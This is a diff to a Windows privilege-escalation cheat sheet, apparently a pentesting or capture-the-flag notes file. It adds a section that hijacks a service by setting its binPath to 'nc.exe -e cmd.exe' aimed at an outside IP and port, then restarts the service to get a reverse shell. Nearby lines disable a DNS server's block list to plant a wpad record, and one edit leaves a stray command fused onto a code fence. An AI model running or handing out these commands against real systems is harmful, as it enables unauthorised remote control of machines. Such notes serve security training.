@@ -15,7 +15,8 @@ tree c:\ /f | more 	Walk through results of the tree command page by page
 ```
 ```bash
 icacls <directory> 	View the permissions set on a directory
-```
+```sc.exe stop VMTools
+
 ```bash
 icacls c:\users /grant joe:f 	Grant a user full permissions to a directory
 ```
@@ -284,7 +285,31 @@ net group "Domain Admins" /dom # verify that perms is escalated
 Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <dc.name.local> # disable block list
 Add-DnsServerResourceRecordA -Name wpad -ZoneName <name.local> -ComputerName <dc.name.local> -IPv4Address <ip>
 ```
-## Print operators
+## SeLoadDriverPrivilege
+
+```bash
+services
+```
+
+Look what services is running for example
+
+```bash
+"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"   True VGAuthService 
+```
+Upload to target machine `nc.exe` 
+
+```bash
+sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe  10.10.14.117  9001"
+```
+
+Start listener in local machine `rlwrap nc -lvnp  9001` rerun service
+
+```bash
+sc.exe stop  VMTools
+#
+sc.exe start VMTools
+```
+
 
 
 
